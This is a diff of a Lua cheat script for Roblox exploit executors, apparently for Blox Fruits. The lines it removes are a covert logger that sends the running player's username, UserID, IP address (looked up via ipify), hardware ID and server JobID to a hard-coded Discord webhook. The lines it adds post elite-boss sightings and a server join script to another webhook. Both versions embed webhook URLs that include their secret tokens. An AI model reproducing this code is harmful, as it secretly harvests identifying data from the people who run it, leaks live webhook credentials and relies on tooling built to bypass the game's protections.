@@ -1,70 +1,86 @@
-function PostWebhook(Url, message)
-    local request = http_request or request or HttpPost or syn.request
-    local data =
-        request(
-        {
-            Url = Url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = game:GetService("HttpService"):JSONEncode(message)
-        }
-    )
-    return ""
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+local EliteWebhookUrl = "https://discord.com/api/webhooks/1291252394944106526/9EIKB-WZYJeIIQmqLB9_th8IYRVOFxl8sEDIFmQO_usf54JaBz85rsGzSe767AtnhodU"
+local function SendWebhook(webhookUrl, data)
+    local jsonData = HttpService:JSONEncode(data)
+    local headers = { ["Content-Type"] = "application/json" }
+    local request = http_request or request or syn.request or fluxus.request or Krnl.request or delta.request
+    local final = { Url = webhookUrl, Body = jsonData, Method = "POST", Headers = headers }
+    local success, response = pcall(function() return request(final) end)
+
+    if not success then
+        warn("Webhook failed:", response)
+    end
 end
 
-function AdminLoggerMsg()
-    AdminMessage = {
-        ["embeds"] = {
+local location
+if game.PlaceId == 2753915549 then
+    location = "Sea 1"
+elseif game.PlaceId == 4442272183 then
+    location = "Sea 2"
+elseif game.PlaceId == 7449423635 then
+    location = "Sea 3"
+else
+    location = "Unknown Location"
+end
+
+local function SendEliteWebhook(EliteName)
+    local PlayerCount = #Players:GetPlayers()
+    local data = {
+        embeds = {
             {
-                ["title"] = "",
-                ["description"] ="",
-                ["type"] = "rich",
-                ["color"] = tonumber(0xFFFF00), --kuning
-                ["fields"] = {
-                    {
-                        ["name"] = "**Username**",
-                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "**UserID**",
-                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "**PlaceID**",
-                        ["value"] = "```" .. game.PlaceId .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**IP Address**",
-                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**Hwid**",
-                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**JobID**",
-                        ["value"] = "```" .. game.JobId .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**Join Code**",
-                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
-                        ["inline"] = false
-                    }
+                title = "Elite Hunter",
+                color = tonumber(0xffa500),
+                footer = {
+                    text = "Created by 𝕭𝖔𝖙𝖚𝖓𝖆.inc",
+                    icon_url = "https://cdn.discordapp.com/attachments/1262105882871730347/1291060042354790461/MaleOcs_r.jpeg?ex=6702049c&is=6700b31c&hm=0363568c502c3bd15b95c0e32d7ad715f8651837dc7e74044f2a2bbc89403ce5&"
                 },
-                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+                timestamp = DateTime.now():ToIsoDate(),
+                fields = {
+                    {
+                        name = "<a:online:1291408185390923878> Overview",
+                        value = "```Note: If No Message, it got blocked by Discord (wait 1-2 hours and it will self-fix) - 𝕭𝖔𝖙𝖚𝖓𝖆.inc```",
+                        inline = false
+                    },
+                    {
+                        name = "🗺️ Location",
+                        value = "```" .. location .. "```",
+                        inline = false
+                    },
+                    {
+                        name = "<:botunalock:1291855989997441144> Elite Name",
+                        value = "```" .. EliteName .. "```",
+                        inline = false
+                    },
+                    {
+                        name = "⚡ Player Count",
+                        value = "```" .. PlayerCount .. "/12```",
+                        inline = false
+                    },
+                    {
+                        name = "📄 Job ID",
+                        value = tostring(game.JobId),
+                        inline = false
+                    },
+                    {
+                        name = "📝 Join Script",
+                        value = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "', game:GetService('Players').LocalPlayer)",
+                        inline = false
+                    }
+                }
             }
         }
     }
-    return AdminMessage
+    SendWebhook(EliteWebhookUrl, data)
 end
-
-PostWebhook("https://discord.com/api/webhooks/1284688725753991228/D5cmCoe7Bf4D7iVeRgzyQaVLIj2tmrLNk3BRfyJ0NyTmqYjR68tMdwp385giw03620SX", AdminLoggerMsg())
+if game:GetService("ReplicatedStorage"):FindFirstChild("Deandre") or game:GetService("Workspace").Enemies:FindFirstChild("Deandre") then
+    SendEliteWebhook("Deandre")
+elseif game:GetService("ReplicatedStorage"):FindFirstChild("Urban") or game:GetService("Workspace").Enemies:FindFirstChild("Urban") then
+    SendEliteWebhook("Urban")
+elseif game:GetService("ReplicatedStorage"):FindFirstChild("Diablo") or game:GetService("Workspace").Enemies:FindFirstChild("Diablo") then
+    SendEliteWebhook("Diablo")
+end
 
 local Notif = {}
 
